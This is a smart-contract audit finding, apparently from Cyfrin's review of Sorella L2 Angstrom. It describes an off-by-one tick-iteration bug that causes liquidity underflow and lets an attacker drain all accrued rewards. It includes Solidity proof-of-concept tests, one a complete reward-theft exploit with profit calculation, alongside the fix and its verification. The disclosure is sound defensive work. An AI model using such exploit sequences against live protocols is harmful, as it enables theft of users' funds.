---
tags:
  - lang/solidity
  - sector/dex
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - vuln/arithmetic/underflow
  - vuln/logic/reward-calculation
  - impact/loss-of-funds/reward-theft
  - novelty/known-pattern
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Sorella]]"
auditors:
  - "[[Giovanni Di Siena]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-01-cyfrin-sorella-l2-angstrom-v2.1.md"
genome:
  - "[[underflow]]"
  - "[[reward-calculation]]"
  - "[[reward-theft]]"
  - "[[known-pattern]]"
  - "[[integer-bounds]]"
  - "[[reward-accounting]]"
---
# All rewards can be stolen due to incorrect active liquidity calculations when the current tick is an exact multiple of the tick spacing at the upper end of a liquidity range

- id: 63008
- impact: HIGH
- protocol: [[Sorella]] L2 Angstrom
- reporter: Giovanni Di Siena (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-01-cyfrin-sorella-l2-angstrom-v2.1.md

## Summary


The bug report describes a scenario where the current tick, `t`, is an exact multiple of the tick spacing, `s`, and is at the upper bound of the active liquidity range. This can cause incorrect calculations and result in arithmetic underflow when swapping. The bug can also lead to incorrect distribution of rewards and an attacker can exploit it to steal all rewards. The recommended mitigation is to perform the net liquidity decrement before any other calculations. The bug has been fixed by Sorella Labs and verified by Cyfrin.

## Details

**Description:** Consider the scenario in which the current tick, `t`, is an exact multiple of the tick spacing, `s`, residing at the upper bound of the active liquidity range `[t0, t1)`, where: `s = 10`, `t0 = 0`, and `t = t1 = 30`. Execution of a zero-for-one swap causes `TickIteratorLib::initDown` to be invoked within `AngstromL2::_zeroForOneDistributeTax`, which calls `TickIterator::reset` and ultimately `TickIterator::_advanceToNextDown`:

```solidity
function _advanceToNextDown(TickIteratorDown memory self) private view {
    do {
        (int16 wordPos, uint8 bitPos) =
@>          TickLib.position((self.currentTick - 1).compress(self.tickSpacing));

        if (bitPos == 255) {
            self.currentWord = self.manager.getPoolBitmapInfo(self.poolId, wordPos);
        }

        bool initialized;
        (initialized, bitPos) = self.currentWord.nextBitPosLte(bitPos);
@>      self.currentTick = TickLib.toTick(wordPos, bitPos, self.tickSpacing);
        if (initialized) break;
    } while (self.endTick < self.currentTick);
}
```

The expectation when swapping from the upper tick of the range, where Uniswap determines zero active liquidity, to an initialized tick with non-zero liquidity, is that this net liquidity delta of the tick crossing will increase the active liquidity. However, the above logic will incorrectly initialize the current tick as `t1 - s`. This means the liquidity delta of `t1` is ignored and can result in arithmetic underflow when decrementing the net liquidity in both `CompensationPriceFinder::getZeroForOne` and `AngstromL2::_zeroForOneCreditRewards`:

```solidity
liquidity = liquidity.sub(liquidityNet);
```

Now consider a second, overlapping liquidity position `[t0', t1')`, where `t0' = -50` and `t1 = 50`. Execution of the same zero-for-one swap again suffers from the boundary tick being skipped; however, in this scenario, if there is sufficient liquidity provided by the overlapping position then the subtraction will not revert. For simplicity, assume both positions provide equal liquidity. In this case, the liquidity of position `[t0, t1)` is not considered in the initial liquidity, but then when `t0` is crossed and the liquidity contribution of this range is subtracted, the invocation of `IUniV4::getTickLiquidity` returns the full liquidity amount. The subsequent computation is therefore left with the liquidity that should be considered active in `[t0', t0]`, but there is no next tick below this range and so the loop exits. This causes execution to fall into the excess distribution logic which updates the global accumulator.

One thing to note here is that the comment states the excess should be distributed to the last position; however, it simply increments `globalGrowthX128` and nothing else (i.e. `rewardGrowthOutsideX128` remains unchanged for the last position).

```solidity
// Distribute remainder to last range and update global accumulator.
unchecked {
    cumulativeGrowthX128 += PoolRewardsLib.getGrowthDelta(taxInEther, liquidity);
    rewards[ticks.poolId].globalGrowthX128 += cumulativeGrowthX128;
}
```

When this incorrect behavior is leveraged by an attacker, it is possible to steal all rewards. While such an attack does not depend on a specific priority fee, it must be sufficient to win the top-of-block swap if needed to move the current tick to a boundary tick and JIT taxes must also be paid on liquidity addition. These caveats combined will decrease the profit, but it can be profitable nevertheless, considering the scenario in which:

* The current tick `t` is either already at or swapped one-for-zero to boundary tick `t1`.
* Due to `rewardGrowthOutsideX128` not being correctly initialized, as reported in H-02, the entry for both `t0` and t1` will be zero.
* Liquidity `L' = L * R / swapTax` is added to `[t1 - s, t1)`, where: `L` is the current liquidity in `[t0, t1)`, and `R` is the current reward balance.
* The current tick is zero-for-one swapped back down to a price immediately below the upper boundary of the attacker's liquidity position, i.e. `t < t1`, minimizing the amount of `token1` spent.
* Upon crossing the tick boundary, `_updateTickMoveDown()` flips `t1` and stores the corresponding `rewardsGrowthOutsideX128` entry as the initial `rewardGrowthGlobalX128`, `G`.
* When `_zeroForOneCreditRewards()` is called, this bug in `TickIteratorDown` causes the subtraction of the (negative) net liquidity for this tick to be skipped, meaning the additional liquidity added to `[t1 - s, t1)` is not added to `liquidity` and is not considered in the calculation.
* This is crucial because it means that the `cumulativeGrowthX128` calculated within the excess distribution block shown above uses a smaller `liquidity` value than intended, resulting in a much larger growth delta as this value is defined as the reward growth **per unit of liquidity**.
* Assuming a `cumulativeGrowthX128` delta of `g`, then `swapTax == g * L` rather than `swapTax == g * (L + L')` such that calculation of the reward growth inside `[t1 - s, t1)` is:

```solidity
   growthInsideX128
== growthGlobalX128 - rewardsGrowthOutsideX128[T0] - rewardsGrowthOutsideX128[T1]
== (G + g) - 0 - G
== g

    g * L'
== g * L * R / swapTax
== g * L * R / (g * L)
== R
```

* Thus when the attacker finally removes their liquidity from `[t1 - s, t1)`, they receive the full `R` rewards and realize a profit.

**Impact:** The active liquidity is calculated incorrectly when the current tick is an exact multiple of the tick spacing at the upper end of a liquidity range. In certain circumstances, this can result in swaps reverting due to underflow. In others, for example if there are multiple overlapping liquidity positions, this can result in incorrect distribution of rewards. In the most impactful case, an attacker can steal all the rewards at a profit.

**Proof of Concept:**
1. This test will cause a liquidity underflow in `_zeroForOneCreditRewards()` at [AngstromL2.sol#L364](https://github.com/sorellaLabs/l2-angstrom/blob/386baff9f903aabb48eeb813d3bd629fc740f50a/src/AngstromL2.sol#L364)

```solidity
function test_cyfrin_swapToBoundaryAddLiqudityAndSwapBackForRevert() public {
    uint256 PRIORITY_FEE = 0.7 gwei;
    int24 INIT_T0 = -50;
    int24 INIT_T1 = 50;
    int24 T0 = 10;
    int24 T1 = 30;

    /* Preconditions */
    assertGt(T0, INIT_T0, "precondition: T0 > INIT_T0");
    assertLt(T1, INIT_T1, "precondition: T1 < INIT_T1");

    PoolKey memory key = initializePool(address(token), 10, 3);
    PoolId id = key.toId();

    angstrom.setPoolLPFee(key, 0.005e6);
    setPriorityFee(PRIORITY_FEE);

    addLiquidity(key, INIT_T0, INIT_T1, 10e21);
    bumpBlock();
    router.swap(key, false, -1000e18, int24(T1).getSqrtPriceAtTick());
    int24 currentTick = manager.getSlot0(id).tick();
    assertEq(currentTick, T1, "precondition: After swap must be sitting on T1");

    addLiquidity(key, T0, T1, 10e21);

    // Now swap back
    bumpBlock();
    router.swap(key, true, -1000e18, int24(INIT_T0 - 1).getSqrtPriceAtTick());
}
```

2. This test will cause a liquidity underflow in `getZeroForOne()` at [CompensationPriceFinder.sol#L67](https://github.com/sorellaLabs/l2-angstrom/blob/386baff9f903aabb48eeb813d3bd629fc740f50a/src/libraries/CompensationPriceFinder.sol#L67)

```solidity
function test_cyfrin_swapBackwardsFromTickBoundaryAndRevert() public {
    uint256 PRIORITY_FEE = 0.7 gwei;
    PoolKey memory key = initializePool(address(token), 10, 20);
    angstrom.setPoolLPFee(key, 50000);

    addLiquidity(key, -10, 20, 10e21);
    assertEq(getRewards(key, -10, 20), 0);

    bumpBlock();

    setPriorityFee(PRIORITY_FEE);
    // NOTE: this currently reverts when decrementing liquidity net in CompensationPriceFinder::getZeroForOne
    // because the swap begins at the upper tick of the position (20), where Uniswap determines the liquidity is 0.
    // Then, when crossing the next initialized tick (10), it tries to decrement liquidity net by 10e21 which reverts.
    vm.expectRevert();
    router.swap(key, true, -1000e18, int24(-10).getSqrtPriceAtTick());
}
```

3. This test demonstrates how all rewards can be stolen by an attacker:

```solidity
struct AttackConfig {
    uint128 INIT_LIQUIDITY;
    uint256 LOOPS_TO_BUILD_UP_REWARDS;
    uint256 PRIORITY_FEE_TO_BUILD_UP_REWARDS;
    uint256 ATTACKER_PRIORITY_FEE;
    int24 INIT_T0;
    int24 INIT_T1;
    int24 START_TICK;
}

function test_cyfrin_stealAllRewards() public {
    AttackConfig memory cfg = AttackConfig({
        INIT_LIQUIDITY: 1e22,
        LOOPS_TO_BUILD_UP_REWARDS: 5,
        PRIORITY_FEE_TO_BUILD_UP_REWARDS: 1000 gwei,
        ATTACKER_PRIORITY_FEE: 5 gwei, // As low as will win TOB because JIT tax must be paid
        INIT_T0: 0,
        INIT_T1: 50,
        START_TICK: 17
    });

    PoolKey memory key = initializePool(address(token), 10, cfg.START_TICK);
    PoolId id = key.toId();

    addLiquidity(key, cfg.INIT_T0, cfg.INIT_T1, cfg.INIT_LIQUIDITY);

    /* Swap back and forth to build up rewards */
    setPriorityFee(cfg.PRIORITY_FEE_TO_BUILD_UP_REWARDS);
    for (uint256 i = 0; i < cfg.LOOPS_TO_BUILD_UP_REWARDS; i++) {
        bumpBlock();
        router.swap(key, true, -10_000e18, int24(cfg.INIT_T0 + 1).getSqrtPriceAtTick());
        bumpBlock();
        router.swap(key, false, -10_000e18, int24(cfg.START_TICK).getSqrtPriceAtTick());
    }

    console2.log("\n\n\n *** ATTACK STARTS ***\n\n\n");

    uint256 rewardsToSteal = angstrom.getPendingPositionRewards(
        key,
        address(router),
        cfg.INIT_T0,
        cfg.INIT_T1,
        bytes32(0));

    uint256 ethBefore = address(router).balance;
    uint256 tokBefore = token.balanceOf(address(router));

    int24 attackTickUpper = (cfg.START_TICK + 10)/10 * 10;
    int24 attackTickLower = attackTickUpper - 10;
    assertLt(attackTickUpper, cfg.INIT_T1, "attackTickUpper >= INIT_T1");
    assertGt(attackTickLower, cfg.INIT_T0, "attackTickLower <= INIT_T0");

    /* Step 1: Attacker moves price to next tick boundary */

    setPriorityFee(0);
    bumpBlock();
    uint256 startPrice = TickMath.getSqrtPriceAtTick(cfg.START_TICK);
    router.swap(key, false, -10_000e18, int24(attackTickUpper).getSqrtPriceAtTick());

    /* Step 2: Attacker swaps zero-to-one back to cfg.START_TICK */

    uint256 swapTax = angstrom.getSwapTaxAmount(cfg.ATTACKER_PRIORITY_FEE);
    uint128 ratio = uint128(rewardsToSteal) * 10_000 / uint128(swapTax);
    uint128 attackLiquidity = cfg.INIT_LIQUIDITY*ratio/10_000;
    console2.log("Calculated ratio as: %s",ratio);

    bumpBlock();
    setPriorityFee(cfg.ATTACKER_PRIORITY_FEE);
    uint256 jitTax = angstrom.getJitTaxAmount(cfg.ATTACKER_PRIORITY_FEE);

    addLiquidity(key, attackTickLower, attackTickUpper, attackLiquidity);
    /* Just swap down to "price at attackTickUpper minus 1" to save on token1 */
    router.swap(key, true, -10e18, (attackTickUpper - 1).getSqrtPriceAtTick());

    (, int256 liqNet) = manager.getTickLiquidity(id, attackTickUpper);
    console2.log("tick liquidity[%s]: %s", vm.toString(attackTickUpper), vm.toString(liqNet));

    // uint256 gr0 = angstrom.testing_getRewardGrowthInsideX128(id, cfg.START_TICK, cfg.INIT_T0, cfg.INIT_T1);
    // console2.log("growthInside[%s,%s]: %s", vm.toString(cfg.INIT_T0), vm.toString(cfg.INIT_T1), gr0);


    // uint256 gr1 = angstrom.testing_getRewardGrowthInsideX128(id, cfg.START_TICK, attackTickLower, attackTickUpper);
    // console2.log("growthInside[%s,%s]: %s", vm.toString(attackTickLower), vm.toString(attackTickUpper), gr1);

    /* Calculate attackRewards before removeLiquidity */
    uint256 attackRewards =
        angstrom.getPendingPositionRewards(
            key,
            address(router),
            attackTickUpper - 10,
            attackTickUpper,
            bytes32(0));


    // Attacker removes the liquidity they added
    router.modifyLiquidity(key, attackTickUpper - 10, attackTickUpper, -int128(attackLiquidity), bytes32(0));


    console2.log("--------------------------------------------------------");
    console2.log("Swap tax:       %s", swapTax);
    console2.log("rewardsToSteal: %s", rewardsToSteal);
    console2.log("Attack rewards: %s", attackRewards);
    console2.log("JIT tax paid:   %s", (jitTax * 2));

    int256 ethDelta = int256(address(router).balance) - int256(ethBefore);
    int256 tokDelta = int256(token.balanceOf(address(router))) - int256(tokBefore);

    /* Price is calculated with respect to START TICK */
    uint256 priceX96 = startPrice;
    uint256 price = priceX96 * priceX96 * 1e18 / 2**192;
    int256 profitInEth = ethDelta + tokDelta * 1e18 / int256(price);

    console2.log("price:          %s", price);

    console2.log("ETH delta:      %s", ethDelta);
    console2.log("TOK delta:      %s", tokDelta);

    console2.log("Profit (ETH):   %s", profitInEth);
}
```

**Recommended Mitigation:** When the current tick is exactly on a liquidity boundary, this off-by-one error should be resolved by performing the the net liquidity decrement prior to any other calculations. Seeding the call from within `reset()` with `currentTick + 1` to be inclusive of the lower bound will avoid skipping the boundary tick without considering the liquidity in `[t1, t1+s)` as being utilized.

**Sorella Labs:** Fixed in commit [c01b6c7](https://github.com/SorellaLabs/l2-angstrom/commit/c01b6c7f6649514a5966151e632a45ad46b1ca4b).

**Cyfrin:** Verified. The net liquidity of the boundary tick is now considered correctly and the attack is no longer profitable.

\clearpage
